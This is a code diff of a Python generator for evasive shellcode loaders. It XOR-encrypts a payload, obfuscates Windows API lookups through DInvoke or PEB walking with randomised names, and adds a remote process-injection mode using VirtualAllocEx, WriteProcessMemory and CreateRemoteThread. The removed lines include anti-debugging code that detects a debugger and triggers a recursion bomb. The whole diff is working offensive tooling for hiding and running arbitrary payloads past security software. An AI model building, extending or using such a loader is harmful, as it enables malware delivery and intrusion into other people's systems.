@@ -2,13 +2,21 @@ import binascii
 import argparse
 import subprocess
 import random
+import json
 import string
 import os
 
-def genString(length):
+def gen_string(length):
     randString = ''
     for i in range(length):
         randString += random.choice(list(string.ascii_letters + string.digits))
+
+    return randString
+
+def gen_var(length):
+    randString = ''
+    for i in range(length):
+        randString += random.choice(list(string.ascii_letters))
 
     return randString
 
@@ -22,17 +30,21 @@ def init_args():
                         required=True)
 
     parser.add_argument('-x', '--xor', help='XOR key to encrypt with', 
-                        default=genString(256))
+                        default=gen_string(256))
 
     parser.add_argument('-ad', '--anti-debug', help='Enable anti debugging option', 
                         dest='debug', 
                         action='store_true')
     
-    parser.add_argument('-l', '--load', 
+    parser.add_argument('-m', '--method', 
                         help='Method to use to dynamically load functions', 
                         choices=['dinvoke', 'pebwalk'],
                         dest='method',
                         default='dinvoke')
+    parser.add_argument('-l', '--load', 
+                        help='Method to use to load and execute shellcode', 
+                        choices=['local', 'inject'],
+                        default='local')
 
     return parser.parse_args()
 
@@ -44,51 +56,72 @@ def xor(data, key):
 
     return outBytes
 
+def gen_loader(funcMap: list, loadLoop: str, used: list):
+    funcName = gen_var(12)
+    # Example of a loadloop
+    '''unsigned char <FUNC_NAME>[] = <MAPPED_FUNC>
+    xor_data(<FUNC_NAME>, sizeof(<FUNC_NAME>), key, key_len);
+    <FUNC_VAR> = (<FUNC_CONSTANT>)GetProcAddress(kernelHandle, (LPCSTR) <FUNC_NAME>);
+    xor_data(<FUNC_NAME>, sizeof(<FUNC_NAME>), key, key_len);'''
+
+    while funcName in used:
+        funcName = gen_var(12)
+
+    # Add a placeholder that can be replaced later
+    loadLoop = loadLoop.replace('<MAPPED_FUNC>', funcMap[1])
+
+    # Generate a variable name to assign the xored character array to
+    loadLoop = loadLoop.replace('<FUNC_NAME>', funcName)
+    used.append(funcName)
+
+    # Get the actual type casting set up
+    loadLoop = loadLoop.replace('<FUNC_CONSTANT>', funcMap[0].upper())
+    loadLoop = loadLoop.replace('<FUNC_HASH>', funcMap[0].upper() + 'HASH')
+    loadLoop = loadLoop.replace('<FUNC_VAR>', funcMap[0][0].lower() + funcMap[0][1:])
+    return loadLoop
+
+
 if __name__ == '__main__':
     args = init_args()
-    ANTI_DEBUG = '''int recursion_bomb(int depth)
-{
-    int sum = 0;
-    if (depth == 0)
-    {
-        return sum + 1;
-    }
-
-    for (int i = 0; i < 100000000000; i++)
-    {
-        sum += recursion_bomb(depth - 1) + 5;
-    }
-
-    return sum;
-}
-
-
-void antiDebug()
-{
-	PPEB pebPtr;
-	// Thread Environment Block (TEB)
-	#if defined(_M_X64) // x64
-	PTEB tebPtr = reinterpret_cast<PTEB>(__readgsqword(reinterpret_cast<DWORD_PTR>(&static_cast<NT_TIB*>(nullptr)->Self)));
-	#else // x86
-	PTEB tebPtr = reinterpret_cast<PTEB>(__readfsdword(reinterpret_cast<DWORD_PTR>(&static_cast<NT_TIB*>(nullptr)->Self)));
-	#endif
-	// Process Environment Block (PEB)
-	pebPtr = tebPtr->ProcessEnvironmentBlock;
-	if (pebPtr->BeingDebugged)
-    {
-        recursion_bomb(100000000);
-        exit(1);
-    }
-}'''
-    funcs = [('Kernel32.dll', '<KERNEL32>'), ('CreateThread', '<CREATE_THREAD>'), ('VirtualAlloc', '<VIRTUAL_ALLOC>'), ('VirtualProtect', '<VIRTUAL_PROTECT>')]
+    used = []
+    funcs = [('Kernel32.dll', '<KERNEL32>'), ('CreateThread', '<CREATE_THREAD>'), 
+             ('VirtualAlloc', '<VIRTUAL_ALLOC>'), ('VirtualProtectEx', '<VIRTUAL_PROTECT_EX>'),
+             ('VirtualProtect', '<VIRTUAL_PROTECT>'), ('CreateProcessA', '<CREATE_PROCESS_A>'), 
+             ('OpenProcess', '<OPEN_PROCESS>'), ('VirtualAllocEx', '<VIRTUAL_ALLOC_EX>'), 
+             ('WriteProcessMemory', '<WRITE_PROCESS_MEMORY>'), ('CreateRemoteThread', '<CREATE_REMOTE_THREAD>'),
+             ('ResumeThread', '<RESUME_THREAD>')
+             ]
     loadMethods = {
-        'dinvoke': 'DInvoke.cpp',
-        'pebwalk': 'PEBWalk.cpp'
+        'dinvoke': 'DInvoke',
+        'pebwalk': 'PEBWalk'
     }
-    srcDir = 'src'
 
-    with open(os.path.join(srcDir, loadMethods[args.method]), 'r') as f:
-        source = f.read()
+    # Load mappings for what techniques need what functions
+    with open('mappings.json', 'r') as f:
+        mappings = json.load(f)
+
+    srcDir = 'src'
+    funcDir = 'functionload'
+    loadDir = 'load'
+
+
+    # Open shellcode load method
+    with open(os.path.join(srcDir, loadDir, args.load) + '.cpp', 'r') as f:
+       source = f.read()
+
+    # Open function load method
+    with open(os.path.join(srcDir, funcDir, loadMethods[args.method], 'Boilerplate.cpp'), 'r') as f:
+        boilerplate = f.read()
+
+    with open(os.path.join(srcDir, funcDir, loadMethods[args.method], 'LoadLoop.cpp'), 'r') as f:
+        loadLoop = f.read()
+
+    # Insert function loading
+    loadConstruct = boilerplate + '\n'
+    for func in mappings['functionsNeeded'][args.load]:
+        loadConstruct += gen_loader(func, loadLoop, used) + '\n\n'
+
+    source = source.replace('<LOAD_FUNCTIONS>', loadConstruct)
 
     try:
         with open(args.bin, 'rb') as f:
@@ -118,8 +151,11 @@ void antiDebug()
 
             source = source.replace(func[1], stringConstruct)
 
+
         if args.debug:
-            source = source.replace('<ANTI_DEBUG>', ANTI_DEBUG)
+            with open("src/evasion/antidebug.cpp", 'r') as f:
+                antiDebug = f.read()
+            source = source.replace('<ANTI_DEBUG>', antiDebug)
         else:
             source = source.replace('<ANTI_DEBUG>', 'void antiDebug(){}')
 
